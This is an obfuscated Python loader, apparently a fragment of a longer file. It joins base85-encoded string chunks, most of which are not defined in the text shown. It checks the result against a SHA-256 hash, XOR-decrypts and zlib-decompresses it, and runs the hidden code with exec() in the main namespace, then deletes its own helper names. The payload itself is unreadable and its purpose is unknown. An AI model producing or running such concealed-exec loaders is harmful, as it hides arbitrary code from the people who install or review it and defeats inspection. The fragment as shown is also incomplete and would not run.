_ctfmjam0mfiuNH = 'SsRC#l9^M+hf+kPrXq5S7fQ0X?7$LNZgP|-3@~(?mPidi7MWlp7>b2%'
_chnHjeP0O1y8gL = '!GA=FAk^kX#&n+fGM#&NDYQ*8Q7<&%I){`)q9xsVBw&@zb_fq=AHP3T'
_coDs1jigfz9f4a = '`Rx|S{2H*|ZE(MH@uKohfC$;K&`axBh6HZbW#+^OM&-`So8(dSL3xH;'
_cuaVsJ6d0hReP7 = 'iClgi+lX%#&V$3z`qokZSb}|-(m!Q3TL|MZv@Q-=!LVA3qpJFY3O853'
_cb9zAVsCJ0F8Mi = 'lwRjgAaWv+n9JirU*_RdAg6CbQX<h-`)kze$HjtmDo>EAURlhIO8*~P'
_ckhsj0DTCI_nLU = 'nZvPx>Lb*xiS@X0kJ+RR$rzUJhgWG~JI&$U93s^|*SJo;PMhI~Sd2n;'
_cpVjQTJDgBB0tL = '<FA?hK@?aMNbCW_xr%O!jXx)vBpZTnHAq9idDHj<4|TbZ5W1J9uM)Y_'
_cfEauq0_DGLeCE = '@U+4x{e_hsNp(`L;DO4HSJqcoq1k%a_^S0vS3Be%u?vdyFoq3*`x6=E'
_cpmoVbTtxHxil1 = '<+d<E$HmhK#oK$Kn+eD2_3W#8Gpj2Sn{37<<uG7R#>%T>M;R7yeAI{$'
_czfDAVfaK3eJyt = 'snlnkP;oL?B7$`!hUEOH7c|ro>&6Gn#H1ipUMwerj?0Dn$Y4{e4!mXp'
_czbUg7wgaZbfya = '`{JwLYisB_T$-clDq}e^*7oUzI7oRZn5DIS)-g<>#Rlx^=Sd71L>1lS'
_co757On8OTD_wW = 'P-qI&U$W1v$1pn0P82NSW=6fdra_z76=Orl9W16rSp`qqvEF1K1oMKr'
_clPmnzxkNEZ_Ip = '%&;P%54?v_%e2VS_>&CDKgI(~T*VSLayt6E)d&r*V*;Bnc`EeETlksG'
_chrBrPDZ3ALUHv = '^eJV_6dm3QoQ<mV*P5H-(8d64{NHt-JJ!lR@N&8kM2hbnSnH+m&Ung0'
_caHEdWSBeIhRqU = 'V=p6?1)Ti^bkTJ(ydlrsKN>!*&Q5SyVhPs}N?+u(9ex~PCapTa^GyB='
_cgCusmsJCNDLfk = '@4%tUioYuqqChF7Tb6>w@K5#8Y6zXiStTG<YBLB<Yl)zuL{16Y@zyKS'
_cdLISVBjklmbLA = 'lNxO1wKIOd@tl@U+?23h6>{+3p1*T?`6lDCl>k!e3$KNeR>L-6oTn*#'
_ccUAgtXALSwMD1 = 'CUZDJg*NV-H^tR3YG---D$p?|=6Ic!;4P}bimO%DioooW!#Q#a3~pek'
_cvWduKXTygYIwc = 'M^_&3^?~54mlK2<+mvHiq6n|jhZi0+?U|(`p3|34ATT+}{Xdo16*|q;'
_cmOcdsxDTkGCJk = 'n^egZR|Sm(AY%dj={?h|UJuNIB0!mr{!6qhUzww_wL2-I&ISU_FD0Q>'
_cyuLmWgZ8lVjlQ = 'fkC#4FOK+;DHrKkF~{r(P`&BD;n`3{Jw|N2^!P7!;_{ndEd0vfTSM09'
_cajEoXZYbQDKvA = 'F_wUuxd$fLm~8f9OA;rjSRk%1Q-36_k~>&pYU#-<F0MZZk+v#Sifr;J'
_ca09DOUTol1iW8 = 'v^qbn^$d{@Mr*?fPi$69P<YIgA+E9#$qAGeBEIF-X}Z|'

_pgYk4_WVdHgScw = __import__('base64').b85decode(_cs_Lmskr8mcI9z + _cyeWJ83FqLtfLO + _cfmK8QBd7XRih2 + _czPB7s5CzU_MGw + _ckSmeQLQmVXRMo + _cuMh5SMG1X_4qk + _ccBwgdZoKHyGgs + _ciMandEnxZjet8 + _cvzhN883diBqhk + _cxltSl4VUlTkH5 + _csIKMqi9n4MPfi + _cg2r4mdT1wLE34 + _csAYWq8A4Fgn53 + _ccowkhgcis2DM9 + _cg9EDPgpd4Q5Jf + _cgG72LIXjmmMV0 + _co2IolPgQIOtHj + _cltJXS4sNbq0Sw + _cxihJuAlFve9dw + _con7VUJJBvjBlv + _cpjaTJbvuA4lh8 + _c_dK6jj4_mh6dQ + _ceQeyOeUUPcn_c + _ct0_kH6_DLulhL + _cd4jrza8lFUsjC + _cqZ4KJuBa5Rpah + _cc7U2aTsFsWqPx + _ch6ahzjrGJKj8b + _cfC1D3_WGxhk7s + _cybPS9pj4HgQit + _cesoXD8SyQPXpx + _ctthWS8dNEFfLd + _ctha3yKNXyfr1h + _crNZq2zn3rKuOC + _cdnPUe_Em4dMnR + _cof4fnRQzphAti + _caI1OWRSXGG3kP + _cnawWZAO5fldVZ + _chUcxA0EmUP8vE + _cfXZUNl5h2_Jy6 + _ckELt_L8ddsvS0 + _c_YdbGCyN8scjR + _ciZAoHWkVTfoYM + _cpoPbZrsDPVjCa + _c_xJYp2bw7vqoV + _cu7ws2PeaHDDox + _c_PZmeaIMH27q4 + _cbKWjf0Q6iJyTh + _cvbDc1xhKqV7N_ + _cgKJjmW9TVCpiR + _cx_FRVyKzMT2Vg + _cwQhQiLJhjesRx + _co6cb4fAlzrcIl + _cbZjgvzK01ymPg + _cggb5uyYx1uhTt + _cpOuNdb4AtRe9t + _cg_bTowkzVqUlt + _cbidc1JrIUuJUL + _cpjaOfhQahcKyP + _cxxWmr3OEzyToA + _cfdZXjXsLZSmjy + _cusSNX2jzztFKc + _ca1FRHJSau8YtQ + _cwgGnxp6tJy6J_ + _c_5rUiorVObgX3 + _cfPCuxMLGAcY6X + _cvh3htY1LR4Dri + _cpOany6sdoncsG + _cayG6VVnk9N_ZV + _cjU61GL44PBkXO + _chfcFT3oRq87r6 + _ceFpzzCvMkwn1c + _cmhQZYg4Ne3r6R + _cspc3sfOxDXoy4 + _cphzb4jbh_OMmS + _c_cIhekWNSECWn + _cd42MjSrSP3JMi + _ci7l26DYmtz6K4 + _cok1hdlSF3YcNT + _cxL1eCfG6nySQg + _ca5PdkI7EDWnxu + _cu3qUN4Bsb1bwK + _chhR7LnBlf2PMB + _ciSPXgQ3XL4AjB + _cgfej4XPj3DjL7 + _cyQJ0QOFHZsBBL + _cjMSlizIDMvBXA + _cdR5YGKqHxeZtb + _cu8awnEhE4f_gt + _cu85FkTVVSTsdW + _chQfQLKtFE0Bsy + _cjOvPTkDwZ8a2M + _cbefKfST1Wg8Fx + _ctuq8drHkhZSBD + _cynWjjO4llCIkH + _c_lO01wzQj4WmD + _cy5riqNcO25hh0 + _ck6eGENSETZjYg + _ciKswp7EJzAM0V + _cmLfUqZMf9NvmR + _ccIgGgSXz_QxIO + _cjGhydFnX5qIit + _cxLSOoCAWghl4j + _crqPFdEmgNblv4 + _cdyuXDCHU9VGTw + _cgkxgVO9rxNIyC + _cjaX6ym7TTQUxK + _cnev3tr6dJ2B9x + _cs91Ky8zDrGXD4 + _cx47tS7TRkJnQv + _ctgGRDHskfJXrC + _capQKi7WmfwsbW + _cbA8rqVsFQx_cI + _cl5BdokyTOJTdz + _ccWZPmihm3vjOV + _cpPqcW0GuHyUTg + _csF2zv5Q9KEerH + _ckLUlmi1K8Gspp + _cqYU0jD2rDeKTj + _caJlgjSq3Rl1ia + _cmoaT3lFEliHSR + _csUFMG1VoSoYQS + _cs3pZlgc_JGjso + _cj_BQzWggOVmr7 + _ck5070oFShXqAe + _c_MK40TcHohCtk + _coq9xUMVo5hY2K + _clNIWJleV8TJeE + _cgRA_taSVhHg10 + _cqqLtfSy2IMmwW + _clQhFP2I8GdIxu + _codKteOwmjCEjA + _caNYRFE2LMziPS + _cfi2I9zWWhW4s8 + _cm2q00qdUCsrPP + _cyjlnlzQGxDIeb + _cvLMR5YUx5wqCj + _ctPiOTQDNL8QiQ + _cd2XDimA4eZePx + _chq0lzncQEQNgq + _cuu8OmeRmjnm_m + _cxSG_YWuD7_brU + _cyc5moy_70xG2r + _cjB0Z5Xl26UhMf + _cyxFsNv2v6fqfj + _c_5ULEUMqTYnB9 + _cfOFLKjS82rKau + _cx7jgkOQ20Cv7y + _cqh5hdgC0_nrtP + _ceBemrCYW8sflj + _chFj53v4Z65BiB + _ceRmE6fpTSi196 + _crORyd_mnVqsee + _cvKs7osT4CLfnT + _czhK8TdBQ4N88j + _ca8fuv6HxEWO6h + _ciFfWcb6LQPnoJ + _cvUk13xTGDvoBd + _cfQ0_FXX02a4OX + _cdud9uNusMAf0f + _cjgXQGWsuyTqEO + _cjcl0llUmaUkQS + _cnpUDijvzoH4hL + _cib0y_mnHJXm1l + _cs8Wtb4ZA1AZKC + _clhlGpthN5f5Dt + _caX5jJPgyqqfcJ + _cczdsMG67OK9MU + _czDLpyh2SK8efP + _cp_Vrv_dxnHe_n + _cq8FmCZDnyiGun + _cy5R611eapov_N + _c_6Elxvsie4ze4 + _csNZdnTKIYQDUF + _cwdUF2QkqDmclo + _cybWX_vuubvMkF + _cmOkZidcty1w5y + _cq7OZPhaQNvxm5 + _cqfeCYNF9h25YQ + _ckfWeUjTSNxMGO + _cyGtg_BkEh_09o + _cugqzL6jznKijQ + _cdJPEfSTqJYWrq + _cvV2p8vSn_NqFj + _cxhuHsFnYRiloS + _cfpivb9bLaMS6j + _cdiwZfXuFRVrOe + _c_Vxl3BGZJeX4F + _cvzYGLljfIpDyc + _cwiCK7E81JUvhG + _cpGkr4zjByl8ny + _cfo_TmlMl8LMsF + _cgOyaDMsiKRya1 + _ct605YD5nmPddl + _cs5YB8NuFFIjan + _ctfmjam0mfiuNH + _chnHjeP0O1y8gL + _coDs1jigfz9f4a + _cuaVsJ6d0hReP7 + _cb9zAVsCJ0F8Mi + _ckhsj0DTCI_nLU + _cpVjQTJDgBB0tL + _cfEauq0_DGLeCE + _cpmoVbTtxHxil1 + _czfDAVfaK3eJyt + _czbUg7wgaZbfya + _co757On8OTD_wW + _clPmnzxkNEZ_Ip + _chrBrPDZ3ALUHv + _caHEdWSBeIhRqU + _cgCusmsJCNDLfk + _cdLISVBjklmbLA + _ccUAgtXALSwMD1 + _cvWduKXTygYIwc + _cmOcdsxDTkGCJk + _cyuLmWgZ8lVjlQ + _cajEoXZYbQDKvA + _ca09DOUTol1iW8)
if __import__('hashlib').sha256(_pgYk4_WVdHgScw).hexdigest() != '89383d5170e7d9282953bbbb9dc1375a3a4135a86976901d5bce384ca01f7b3c':
    __import__('sys').exit(1)
_xtB9wLo5jIy3n8 = bytes([212, 25, 157, 20, 118, 223, 147, 217, 193, 64, 218, 138, 105])
_fksxxI9yxGDDojY = bytes([6, 34, 178, 207, 244, 191, 195, 144, 144, 149, 104, 246, 148])

def _fxuDQ8TT3K9Xh9N(_bkXhxFDy5DriJj, _kb1BrPUWnvzijK):
    return bytes(_bkXhxFDy5DriJj[_idCb2DCy2XS3hy] ^ _kb1BrPUWnvzijK[_idCb2DCy2XS3hy % len(_kb1BrPUWnvzijK)] for _idCb2DCy2XS3hy in range(len(_bkXhxFDy5DriJj)))

def _fdp5JVc3cQuLwy1(_tag8AdEhKgM2Tv):
    import zlib
    return zlib.decompress(_tag8AdEhKgM2Tv) # Un seul niveau de zlib ici pour simplifier

def _fez1y0U6hmRn5HF():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xoOxIV1LRb52UC = _fxuDQ8TT3K9Xh9N(_pgYk4_WVdHgScw, _xtB9wLo5jIy3n8)
    # 2. Décompression Zlib
    _dfZKPpC9GGyQtR = _fdp5JVc3cQuLwy1(_xoOxIV1LRb52UC)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dfZKPpC9GGyQtR.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nmwoUgrqvBzyxZ = _main.__dict__
    _nmwoUgrqvBzyxZ.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nmwoUgrqvBzyxZ)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fez1y0U6hmRn5HF()
try:
    del _fxuDQ8TT3K9Xh9N, _fdp5JVc3cQuLwy1, _fez1y0U6hmRn5HF
    del _pgYk4_WVdHgScw, _xtB9wLo5jIy3n8, _fksxxI9yxGDDojY
except:
    pass
